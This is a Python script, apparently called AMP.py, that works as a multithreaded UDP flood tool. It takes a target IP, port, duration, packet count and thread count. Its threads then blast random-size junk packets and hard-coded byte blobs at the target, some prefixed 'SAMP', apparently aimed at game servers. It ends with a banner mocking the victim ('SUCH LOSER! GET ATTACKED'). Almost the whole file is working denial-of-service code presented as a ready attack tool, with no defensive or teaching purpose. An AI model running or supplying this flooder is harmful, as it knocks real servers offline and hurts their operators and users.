from time import time as tt
import socket
import random
import os
import sys
import threading

xcrand = [
 b'SAMP\x90\xd9\x1dMa\x1ep\nF[\x00',
 b'SAMP\x958\xe1\xa9a\x1ec',
 b'SAMP\x958\xe1\xa9a\x1ei',
 b'SAMP\x958\xe1\xa9a\x1er',
 b'SAMP\x958\xe1\xa9a\x1ev',
 b'SAMP\x958\xe1\xa9a\x1eg',
 b'\x08\x1eb\xda',
 b'\x08\x1eb\xda',
 b'\x02\x1e\xfdS',
 b'\x08\x1eM\xda',
 b'\x02\x1e\xfd@',
 b'\x08\x1e~\xda']
 
xcpass = [
 b'/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A',
 b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67',
 b'\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54',
 b'\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff',
 b'\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45'    
]

def send_packets(ip, port, time, packet_size):
    startup = tt()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while True:
        try:
            nulled = b""
            data  = random._urandom(int(random.randint(500, 1024)))
            data2 = random._urandom(int(random.randint(1025, 65535)))
            data3 = os.urandom(int(random.randint(1025, 65535)))
            data4 = random._urandom(int(random.randint(1, 65535)))
            data5 = os.urandom(int(random.randint(1, 65535)))
            data6 = random._urandom(1081)
            data7 = random._urandom(999)
            data8 = xcrand[random.randrange(0, 1)]

            endtime = tt()
            if (startup + time) < endtime:
                break

            for x in range(packet_size):
                sock.sendto(nulled, (ip, port))
                sock.sendto(data, (ip, port))
                sock.sendto(data2, (ip, port))
                sock.sendto(data3, (ip, port))
                sock.sendto(data4, (ip, port))
                sock.sendto(data5, (ip, port))
                sock.sendto(data6, (ip, port))
                sock.sendto(data7, (ip, port))
                sock.sendto(data8, (ip, port))
                sock.sendto(xcpass[0], (ip, port))
                sock.sendto(xcpass[0], (ip, port))
                sock.sendto(xcpass[2], (ip, port))
                sock.sendto(xcrand[0], (ip, port))
                sock.sendto(xcrand[0], (ip, port))
                sock.sendto(xcrand[1], (ip, port))
                sock.sendto(xcrand[2], (ip, port))
                sock.sendto(xcrand[3], (ip, port))
                sock.sendto(xcrand[4], (ip, port))
                sock.sendto(xcrand[5], (ip, port))
                sock.sendto(xcrand[6], (ip, port))
                sock.sendto(xcrand[7], (ip, port))
                sock.sendto(xcrand[8], (ip, port))
                sock.sendto(xcrand[9], (ip, port))
                sock.sendto(xcrand[10], (ip, port))
                sock.sendto(xcrand[11], (ip, port))
        except:
            pass
        
def attack(ip, port, time, packet_size, threads):
    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))

    for _ in range(threads):
        th = threading.Thread(target=send_packets, args=(ip, port, time, packet_size))
        th.start()

    (banner) = f'''\033[0;36m

⢀⣠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣄⡀
⣿⡋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⢙⣿     Attack Succesfully sent to
⣿⡇⠀⠀⠀⣠⣴⠾⠿⠷⣦⡀⢀⣴⠾⠿⠷⣦⣄⠀⠀⢸⣿
⢸⡇⠀⠀⢰⡟⠁⠀⣀⣀⠈⢿⡿⠁⣀⣀⠀⠈⢻⡆⠀⢸⡇      IP: {ip}
⢸⣷⠀⠀⢸⡇⠀⠀⠿⠿⠁⣸⣇⠈⠿⠿⠀⠀⢸⡇⠀⣾⡇      PORT: {port}
⠘⣿⠀⠀⠈⠻⣦⣄⣀⣤⣾⠛⠛⣷⣤⣀⣠⣴⠟⠁⠀⣿⠃      TIME: {time}
⠀⣿⠀⠘⢷⣄⠀⠉⠉⠙⢿⠄⠠⡿⠋⠉⠉⠀⣠⡾⠃⣿⠀      PACKETS: {packet_size}
⠀⣿⠀⠀⠀⠙⠻⢶⣦⣤⣤⣤⣤⣤⣤⣴⡶⠟⠋⠀⠀⣿⠀      THREADS: {threads}
⠀⣿⡄⠀⠀⠀⠀⠀⣿⣀⣹⡇⢸⣏⣀⣿⠀⠀⠀⠀⢠⣿⠀      
⠀⢿⡇⠀⠀⠀⠀⠀⠉⠉⠉⠁⠈⠉⠉⠉⠀⠀⠀⠀⢸⡿⠀     
⠀⢸⣿⣿⣿⣿⣟⠛⠛⠛⣻⡿⢿⣟⠛⠛⠛⣻⣿⣿⣿⣿⡇⠀  HAHAHA {ip} SUCH LOSER!
⠀⢸⣿⣿⣿⣿⣿⣷⣤⣾⣿⣶⣶⣿⣷⣤⣾⣿⣿⣿⣿⣿⡇⠀  GET ATTACKED WITH SIZE {packet_size} PACKETS
⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀
⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠻⣧⣼⠟⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀

\033[0;35m
'''
    print(banner)

if __name__ == '__main__':
    if len(sys.argv) != 6:
        print('Usage: python AMP.py <ip> <port> <time> <packet_size> <threads>')
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    time = int(sys.argv[3])
    packet_size = int(sys.argv[4])
    threads = int(sys.argv[5])

    try:
        attack(ip, port, time, packet_size, threads)
    except KeyboardInterrupt:
        print('Attack stopped.')
